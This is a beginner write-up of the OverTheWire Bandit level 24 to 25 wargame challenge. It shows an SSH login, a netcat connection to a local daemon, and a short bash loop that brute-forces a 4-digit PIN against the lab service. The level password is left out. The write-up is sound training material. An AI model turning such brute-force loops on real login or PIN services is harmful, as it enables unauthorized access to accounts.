---
title: "Level 24 -> Level 25"
description: "Learn how to write shell script."
date: 2026-08-18
platform: OverTheWire
game: Bandit
level: "24 -> 25"
difficulty: Easy
category: Linux
tags:
  - SSH
  - Linux
  - Beginner
---

## Challenge

To sum up the tasks step by step:

What we know is that → `"A daemon is listening on port 30002 and will give you the password for bandit25"`

and we need to:

Brute-force pinecode, while feeding <`bandit24 password`> and <`4-digit pincode`> to the listening daemon.

## Enumeration

Connect to the non-standard SSH port:

```sh title="Terminal"
ssh -p 2220 bandit24@bandit.labs.overthewire.org 
```

## Exploitation

After logging in:

Let's begin by establising a connection on port 30002
```sh title="Terminal"
nc localhost 30002
# The result:
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

It's waiting for us to give the correct password + pincode but we don't really know what the pincode is.

Now, we need to write a script to brute-force the pincode, because we definitely won't try 10000 combinations for 10000 times. We're lazy, so we need something easier than that.
```sh title="Terminal"
# First create a directory to store the script file.
mktemp -d
# The result:
/tmp/tmp.RiXWVLyDml

cd /tmp/tmp.RiXWVLyDml
vim brute_force.sh
```

Now the logical step in the loop is:
1. We write bandit24 password along with possible pincode to brute-force.
2. We feed them to the deamon listening connection on port 30002 and once we execute the shell, we'll see server response.

And to loop over 10000 combinations where it must be 4-digit number, that means we want to loop for 0000 to 9999, so it becomes {0000..9999}.

```sh title="Terminal"
#!/bin/bash
{
  for i in {0000..9999}; do
    echo "[PreviousLevelPassword] $i"
  done
} | nc localhost 30002
```

Don't forget to change permission.
```sh title="Terminal"
chmod +x brute_foutce.sh
```

Now run it.
```sh title="Terminal"
./brute_force.sh
```

Once the password and pinecode combination fed to the deamon is correct, it will reveal the password needed to access the next Bandit level.

The real password is intentionally omitted from this public example. Run the commands above to retrieve it yourself.

## Lessons learned

:::tip[Key takeaways]

- A deamon is a background service that runs quietly in the background.
- To loop over 10000 combinations where it must be 4-digit number, we'll want to loop for 0000 to 9999, which is {0000..9999} in the script.

:::